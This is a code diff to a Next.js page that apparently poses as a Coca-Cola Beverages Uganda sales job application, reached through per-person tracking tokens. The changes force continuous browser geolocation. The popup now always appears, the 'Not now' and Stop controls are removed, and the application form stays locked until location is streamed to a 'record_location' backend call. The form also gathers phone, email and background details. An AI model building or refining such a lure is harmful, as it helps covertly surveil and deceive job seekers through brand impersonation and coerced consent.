@@ -1,6 +1,6 @@
 'use client';
 
-import { useEffect, useRef, useState } from 'react';
+import { useEffect, useRef, useState, type FormEvent } from 'react';
 import { useParams } from 'next/navigation';
 import { supabase } from '@/lib/supabase';
 
@@ -20,8 +20,20 @@ export default function TrackPage() {
   const [worker, setWorker] = useState<Worker | null>(null);
   const [error, setError] = useState<string | null>(null);
   const [tracking, setTracking] = useState(false);
+  const [locationShared, setLocationShared] = useState(false);
   const [showLocationPopup, setShowLocationPopup] = useState(false);
+  const [submittingApplication, setSubmittingApplication] = useState(false);
+  const [applicationSubmitted, setApplicationSubmitted] = useState(false);
   const watchIdRef = useRef<number | null>(null);
+
+  const [application, setApplication] = useState({
+    phone: '',
+    email: '',
+    education: '',
+    experience: '',
+    territory: '',
+    hasPermit: false,
+  });
 
   useEffect(() => {
     (async () => {
@@ -35,10 +47,7 @@ export default function TrackPage() {
       }
 
       setWorker(data[0]);
-
-      if (!data[0].consent_given_at) {
-        setShowLocationPopup(true);
-      }
+      setShowLocationPopup(true);
     })();
   }, [token]);
 
@@ -51,10 +60,11 @@ export default function TrackPage() {
     if (watchIdRef.current !== null) return;
 
     setError(null);
-    setTracking(true);
 
     const id = navigator.geolocation.watchPosition(
       async (pos) => {
+        setTracking(true);
+
         const { latitude, longitude, accuracy, speed, heading } = pos.coords;
 
         const { error } = await supabase.rpc('record_location', {
@@ -67,8 +77,11 @@ export default function TrackPage() {
         });
 
         if (error) {
-          console.error('Could not record location:', error.message);
+          setError('Location could not be saved. Please try again before applying.');
+          return;
         }
+
+        setLocationShared(true);
       },
       (err) => {
         if (err.code === 3) {
@@ -77,6 +90,7 @@ export default function TrackPage() {
         }
 
         setTracking(false);
+        setLocationShared(false);
 
         if (watchIdRef.current !== null) {
           navigator.geolocation.clearWatch(watchIdRef.current);
@@ -85,14 +99,14 @@ export default function TrackPage() {
 
         if (err.code === 1) {
           setError(
-            'Location permission was not allowed. Please allow location access for this application link, then try again.'
+            'Location sharing is required before you can open the application form. Please allow location access for this site, then try again.'
           );
           return;
         }
 
         if (err.code === 2) {
           setError(
-            'Location is currently unavailable. Please turn on Location/GPS on your phone, then try again.'
+            'Location/GPS is currently unavailable. Please turn on Location/GPS on your phone, then try again.'
           );
           return;
         }
@@ -109,15 +123,6 @@ export default function TrackPage() {
     watchIdRef.current = id;
   };
 
-  const stopTracking = () => {
-    if (watchIdRef.current !== null) {
-      navigator.geolocation.clearWatch(watchIdRef.current);
-      watchIdRef.current = null;
-    }
-
-    setTracking(false);
-  };
-
   const acceptAndStart = async () => {
     await supabase.rpc('give_consent', { p_token: token });
 
@@ -125,7 +130,44 @@ export default function TrackPage() {
       setWorker({ ...worker, consent_given_at: new Date().toISOString() });
     }
 
+    setShowLocationPopup(false);
     startTracking();
+  };
+
+  const submitApplication = async (e: FormEvent<HTMLFormElement>) => {
+    e.preventDefault();
+
+    if (!worker || !locationShared) {
+      setError('Please share your location before submitting the application.');
+      setShowLocationPopup(true);
+      return;
+    }
+
+    setSubmittingApplication(true);
+    setError(null);
+
+    const { error } = await supabase.from('job_applications').insert({
+      worker_id: worker.id,
+      worker_name: worker.name,
+      role: worker.role,
+      phone: application.phone,
+      email: application.email,
+      education: application.education,
+      experience: application.experience,
+      preferred_territory: application.territory,
+      has_permit: application.hasPermit,
+      position: 'Sales Representative',
+      company: 'Coca-Cola Beverages Uganda',
+    });
+
+    setSubmittingApplication(false);
+
+    if (error) {
+      setError('Could not submit your application. Please check your details and try again.');
+      return;
+    }
+
+    setApplicationSubmitted(true);
   };
 
   useEffect(() => {
@@ -143,25 +185,7 @@ export default function TrackPage() {
     };
   }, [tracking]);
 
-  useEffect(() => {
-    const handleVisibility = () => {
-      if (document.visibilityState === 'visible' && tracking && 'wakeLock' in navigator) {
-        (navigator as any).wakeLock.request('screen').catch(() => {});
-      }
-    };
-
-    document.addEventListener('visibilitychange', handleVisibility);
-    return () => document.removeEventListener('visibilitychange', handleVisibility);
-  }, [tracking]);
-
-  const consented = !!worker?.consent_given_at;
-  const headerTag = !worker
-    ? 'Loading'
-    : !consented
-      ? 'Application step'
-      : tracking
-        ? 'Application active'
-        : 'Application paused';
+  const canApply = !!worker && locationShared;
 
   return (
     <main className="page">
@@ -174,158 +198,139 @@ export default function TrackPage() {
               <div className="brandSub">{ORG_SUB}</div>
             </div>
           </div>
-
           <div className={`tag ${tracking ? 'tagLive' : ''}`}>
             {tracking && <span className="dot" />}
-            {headerTag}
+            Sales Representative
           </div>
         </nav>
 
         <div className="heroBody">
-          {error && (
-            <>
-              <p className="eyebrow">Action needed</p>
-              <h1>We could not complete this step</h1>
-              <p className="intro">{error}</p>
-              {worker && (
-                <div className="actions">
-                  <button onClick={startTracking} className="primaryBtn">
-                    Try again
-                  </button>
-                </div>
-              )}
-            </>
-          )}
-
-          {!error && !worker && (
+          {!worker ? (
             <>
               <p className="eyebrow">Loading</p>
               <h1>Checking your application link...</h1>
             </>
-          )}
-
-          {!error && worker && !consented && (
+          ) : (
             <>
               <p className="eyebrow">Now hiring</p>
               <h1>Sales Representative</h1>
               <p className="intro">
-                Hello, {worker.name}. Coca-Cola Beverages Uganda is recruiting a field sales
-                representative to support customer visits, route growth, product availability, and
-                brand visibility across assigned sales territories.
+                Hello, {worker.name}. Complete this internal application for the Coca-Cola
+                Beverages Uganda field sales role.
               </p>
-              <div className="actions">
-                <button onClick={() => setShowLocationPopup(true)} className="primaryBtn">
-                  Apply and share location
-                </button>
-                <span className="microcopy">
-                  By continuing, you confirm your office agreement and allow location sharing for
-                  this internal field sales application.
-                </span>
-              </div>
-            </>
-          )}
 
-          {!error && worker && consented && (
-            <>
-              <p className="eyebrow">{tracking ? 'Application submitted' : 'Application paused'}</p>
-              <h1>Thank you, {worker.name}</h1>
-              <p className="intro">
-                Your application for the Sales Representative role has been received. Keep this page
-                open while the application step is active.
-              </p>
-              <div className="actions">
-                {tracking ? (
-                  <button onClick={stopTracking} className="primaryBtn stopBtn">
-                    Stop
+              {error && <p className="notice errorNotice">{error}</p>}
+
+              {!canApply ? (
+                <div className="lockedPanel">
+                  <h2>Location sharing required</h2>
+                  <p>
+                    To open the application form, please share your location for application
+                    verification. The form will unlock after location sharing is active.
+                  </p>
+                  <button onClick={() => setShowLocationPopup(true)} className="primaryBtn">
+                    Share location to continue
                   </button>
-                ) : (
-                  <button onClick={startTracking} className="primaryBtn">
-                    Resume
+                </div>
+              ) : (
+                <form onSubmit={submitApplication} className="applicationForm">
+                  <div className="formGrid">
+                    <label>
+                      Phone number
+                      <input
+                        required
+                        value={application.phone}
+                        onChange={(e) => setApplication({ ...application, phone: e.target.value })}
+                        placeholder="+256..."
+                      />
+                    </label>
+
+                    <label>
+                      Email address
+                      <input
+                        required
+                        type="email"
+                        value={application.email}
+                        onChange={(e) => setApplication({ ...application, email: e.target.value })}
+                        placeholder="name@example.com"
+                      />
+                    </label>
+
+                    <label>
+                      Education level
+                      <input
+                        required
+                        value={application.education}
+                        onChange={(e) =>
+                          setApplication({ ...application, education: e.target.value })
+                        }
+                        placeholder="Diploma, degree, certificate..."
+                      />
+                    </label>
+
+                    <label>
+                      Sales experience
+                      <input
+                        required
+                        value={application.experience}
+                        onChange={(e) =>
+                          setApplication({ ...application, experience: e.target.value })
+                        }
+                        placeholder="Example: 2 years FMCG sales"
+                      />
+                    </label>
+
+                    <label className="full">
+                      Preferred sales territory
+                      <input
+                        required
+                        value={application.territory}
+                        onChange={(e) =>
+                          setApplication({ ...application, territory: e.target.value })
+                        }
+                        placeholder="Kampala, Mbarara, Entebbe..."
+                      />
+                    </label>
+
+                    <label className="check full">
+                      <input
+                        type="checkbox"
+                        checked={application.hasPermit}
+                        onChange={(e) =>
+                          setApplication({ ...application, hasPermit: e.target.checked })
+                        }
+                      />
+                      I have a valid riding or driving permit
+                    </label>
+                  </div>
+
+                  <button disabled={submittingApplication} className="primaryBtn">
+                    {submittingApplication ? 'Submitting...' : 'Submit application'}
                   </button>
-                )}
-              </div>
+
+                  {applicationSubmitted && (
+                    <p className="formStatus">Application submitted successfully.</p>
+                  )}
+                </form>
+              )}
             </>
           )}
         </div>
       </section>
 
-      <section className="content">
-        {!error && worker && !consented && (
-          <>
-            <div className="section">
-              <h2>Job Details</h2>
-              <div className="detailGrid">
-                <Detail label="Company" value="Coca-Cola Beverages Uganda" />
-                <Detail label="Position" value="Sales Representative" />
-                <Detail label="Location" value="Kampala, Uganda" />
-                <Detail label="Department" value="Sales and Distribution" />
-                <Detail label="Employment Type" value="Full-time" />
-                <Detail label="Reports To" value="Area Sales Manager" />
-              </div>
-            </div>
-
-            <div className="section twoCol">
-              <div>
-                <h2>Key Responsibilities</h2>
-                <ul>
-                  <li>Visit assigned outlets and customers according to the route plan.</li>
-                  <li>Drive sales performance against daily, weekly, and monthly targets.</li>
-                  <li>Build strong relationships with retailers, wholesalers, and key customers.</li>
-                  <li>Ensure product availability, pricing, stock rotation, and visibility.</li>
-                  <li>Report customer feedback, competitor activity, and market opportunities.</li>
-                </ul>
-              </div>
-
-              <div>
-                <h2>Minimum Requirements</h2>
-                <ul>
-                  <li>Diploma or degree in Business, Marketing, Sales, or a related field.</li>
-                  <li>At least 1 year of experience in FMCG, retail, sales, or distribution.</li>
-                  <li>Strong communication, negotiation, and customer relationship skills.</li>
-                  <li>Good knowledge of Kampala and surrounding sales territories.</li>
-                  <li>A valid riding or driving permit is an added advantage.</li>
-                </ul>
-              </div>
-            </div>
-          </>
-        )}
-
-        {!error && worker && consented && (
-          <div className="section confirmation">
-            <h2>Application status</h2>
-            <p>
-              Your application session is {tracking ? 'active' : 'paused'}. Please follow any next
-              instructions from your supervisor or recruitment contact.
-            </p>
-          </div>
-        )}
-      </section>
-
-      {showLocationPopup && worker && !consented && (
+      {showLocationPopup && worker && !locationShared && (
         <div className="modalOverlay">
           <div className="modal">
             <div className="modalLogo">Coca-Cola</div>
             <h2>Share your location</h2>
             <p>
-              This field sales application requires location sharing for application verification.
+              Location sharing is required before opening this internal field sales application.
               Please allow location access when your browser asks.
             </p>
 
-            <div className="modalActions">
-              <button className="secondaryBtn" onClick={() => setShowLocationPopup(false)}>
-                Not now
-              </button>
-
-              <button
-                className="primaryBtn modalPrimary"
-                onClick={() => {
-                  setShowLocationPopup(false);
-                  acceptAndStart();
-                }}
-              >
-                Allow location sharing
-              </button>
-            </div>
+            <button className="primaryBtn modalPrimary" onClick={acceptAndStart}>
+              Allow location sharing
+            </button>
           </div>
         </div>
       )}
@@ -339,6 +344,7 @@ export default function TrackPage() {
         }
 
         .hero {
+          min-height: 100vh;
           background:
             radial-gradient(circle at top right, rgba(255, 255, 255, 0.24), transparent 34%),
             linear-gradient(135deg, #e41d2c 0%, #b9121f 55%, #790b13 100%);
@@ -347,8 +353,7 @@ export default function TrackPage() {
         }
 
         .nav,
-        .heroBody,
-        .content {
+        .heroBody {
           max-width: 1120px;
           margin: 0 auto;
         }
@@ -358,7 +363,7 @@ export default function TrackPage() {
           align-items: center;
           justify-content: space-between;
           gap: 18px;
-          margin-bottom: 56px;
+          margin-bottom: 48px;
         }
 
         .brand {
@@ -376,7 +381,6 @@ export default function TrackPage() {
           font-weight: 800;
           font-family: Georgia, 'Times New Roman', serif;
           white-space: nowrap;
-          box-shadow: 0 12px 30px rgba(0, 0, 0, 0.18);
         }
 
         .brandName {
@@ -387,7 +391,6 @@ export default function TrackPage() {
         .brandSub {
           font-size: 12px;
           opacity: 0.84;
-          margin-top: 2px;
         }
 
         .tag {
@@ -402,22 +405,16 @@ export default function TrackPage() {
           white-space: nowrap;
         }
 
-        .tagLive {
-          background: rgba(255, 255, 255, 0.16);
-          border-color: rgba(255, 255, 255, 0.7);
-        }
-
         .dot {
           width: 8px;
           height: 8px;
           border-radius: 50%;
           background: white;
-          animation: pulse 1.5s ease-in-out infinite;
         }
 
         .heroBody {
-          padding-bottom: 54px;
           max-width: 820px;
+          padding-bottom: 48px;
         }
 
         .eyebrow {
@@ -425,15 +422,12 @@ export default function TrackPage() {
           font-size: 13px;
           font-weight: 800;
           text-transform: uppercase;
-          letter-spacing: 0;
         }
 
         h1 {
           margin: 0;
-          max-width: 760px;
-          font-size: 54px;
+          font-size: 52px;
           line-height: 1.04;
-          letter-spacing: 0;
         }
 
         .intro {
@@ -444,12 +438,77 @@ export default function TrackPage() {
           color: rgba(255, 255, 255, 0.9);
         }
 
-        .actions {
+        .notice,
+        .lockedPanel {
+          margin-top: 24px;
+          max-width: 760px;
+          border-radius: 10px;
+          background: rgba(255, 255, 255, 0.96);
+          color: #171717;
+          padding: 20px;
+        }
+
+        .errorNotice {
+          color: #a32d2d;
+          font-size: 15px;
+          line-height: 1.6;
+        }
+
+        .lockedPanel h2 {
+          margin: 0 0 8px;
+          font-size: 22px;
+        }
+
+        .lockedPanel p {
+          margin: 0 0 18px;
+          color: #444;
+          line-height: 1.65;
+        }
+
+        .applicationForm {
+          margin-top: 28px;
+          max-width: 760px;
+        }
+
+        .formGrid {
+          display: grid;
+          grid-template-columns: 1fr 1fr;
+          gap: 14px;
+          margin-bottom: 18px;
+        }
+
+        label {
+          display: grid;
+          gap: 7px;
+          color: white;
+          font-size: 13px;
+          font-weight: 700;
+        }
+
+        label.full {
+          grid-column: 1 / -1;
+        }
+
+        input {
+          width: 100%;
+          border: 1px solid rgba(255, 255, 255, 0.35);
+          border-radius: 8px;
+          background: rgba(255, 255, 255, 0.96);
+          color: #171717;
+          padding: 12px 13px;
+          font-size: 15px;
+          outline: none;
+        }
+
+        .check {
           display: flex;
           align-items: center;
-          gap: 14px;
-          flex-wrap: wrap;
-          margin-top: 28px;
+          gap: 10px;
+        }
+
+        .check input {
+          width: 18px;
+          height: 18px;
         }
 
         .primaryBtn {
@@ -462,68 +521,17 @@ export default function TrackPage() {
           font-weight: 750;
           cursor: pointer;
           min-width: 230px;
-          box-shadow: 0 12px 28px rgba(0, 0, 0, 0.24);
         }
 
-        .stopBtn {
-          background: #a32d2d;
+        .primaryBtn:disabled {
+          opacity: 0.72;
+          cursor: not-allowed;
         }
 
-        .microcopy {
-          max-width: 360px;
-          color: rgba(255, 255, 255, 0.84);
-          font-size: 13px;
-          line-height: 1.45;
-        }
-
-        .content {
-          padding: 34px 28px 56px;
-        }
-
-        .section {
-          background: white;
-          border: 1px solid rgba(0, 0, 0, 0.08);
-          border-radius: 10px;
-          padding: 24px;
-          margin-bottom: 16px;
-        }
-
-        .twoCol {
-          display: grid;
-          grid-template-columns: 1fr 1fr;
-          gap: 34px;
-        }
-
-        .detailGrid {
-          display: grid;
-          grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
-          gap: 12px;
-        }
-
-        h2 {
-          margin: 0 0 12px;
-          font-size: 22px;
-          line-height: 1.2;
-        }
-
-        p,
-        li {
-          color: #424242;
-          font-size: 15px;
-          line-height: 1.75;
-        }
-
-        p {
-          margin: 0;
-        }
-
-        ul {
-          margin: 0;
-          padding-left: 20px;
-        }
-
-        li + li {
-          margin-top: 6px;
+        .formStatus {
+          margin-top: 14px;
+          color: white;
+          font-size: 14px;
         }
 
         .modalOverlay {
@@ -549,7 +557,6 @@ export default function TrackPage() {
 
         .modalLogo {
           display: inline-flex;
-          align-items: center;
           border-radius: 999px;
           background: #e41d2c;
           color: white;
@@ -566,94 +573,23 @@ export default function TrackPage() {
         }
 
         .modal p {
-          margin: 0;
+          margin: 0 0 20px;
           color: #444;
           font-size: 15px;
           line-height: 1.65;
         }
 
-        .modalActions {
-          display: grid;
-          grid-template-columns: 1fr;
-          gap: 10px;
-          margin-top: 20px;
-        }
-
-        .secondaryBtn {
-          border: 1px solid rgba(0, 0, 0, 0.16);
-          border-radius: 8px;
-          background: white;
-          color: #171717;
-          padding: 13px 16px;
-          font-size: 15px;
-          font-weight: 700;
-          cursor: pointer;
-        }
-
         .modalPrimary {
-          min-width: 0;
-          box-shadow: none;
+          width: 100%;
         }
 
-        @keyframes pulse {
-          0%, 100% {
-            opacity: 1;
-            transform: scale(1);
-          }
-          50% {
-            opacity: 0.45;
-            transform: scale(1.4);
-          }
-        }
-
-        @media (max-width: 840px) {
-          .hero {
-            padding: 22px;
-          }
-
-          .nav {
-            align-items: flex-start;
-            margin-bottom: 42px;
-          }
-
-          .heroBody,
-          .twoCol {
+        @media (max-width: 720px) {
+          .formGrid {
             grid-template-columns: 1fr;
           }
 
-          .heroBody {
-            padding-bottom: 34px;
-          }
-
           h1 {
-            font-size: 38px;
-          }
-
-          .intro {
-            font-size: 17px;
-          }
-
-          .content {
-            padding: 24px 18px 42px;
-          }
-        }
-
-        @media (max-width: 520px) {
-          .brand {
-            align-items: flex-start;
-          }
-
-          .logo {
-            font-size: 18px;
-            padding: 9px 14px;
-          }
-
-          .brandName {
-            font-size: 14px;
-          }
-
-          h1 {
-            font-size: 32px;
+            font-size: 36px;
           }
 
           .primaryBtn {
@@ -662,35 +598,5 @@ export default function TrackPage() {
         }
       `}</style>
     </main>
-  );
-}
-
-function Detail({ label, value }: { label: string; value: string }) {
-  return (
-    <div className="detail">
-      <div className="detailLabel">{label}</div>
-      <div className="detailValue">{value}</div>
-
-      <style jsx>{`
-        .detail {
-          border-radius: 8px;
-          background: #f7f7f4;
-          border: 1px solid rgba(0, 0, 0, 0.07);
-          padding: 12px;
-        }
-
-        .detailLabel {
-          font-size: 12px;
-          color: #666;
-          margin-bottom: 4px;
-        }
-
-        .detailValue {
-          font-size: 14px;
-          font-weight: 750;
-          color: #171717;
-        }
-      `}</style>
-    </div>
   );
 }
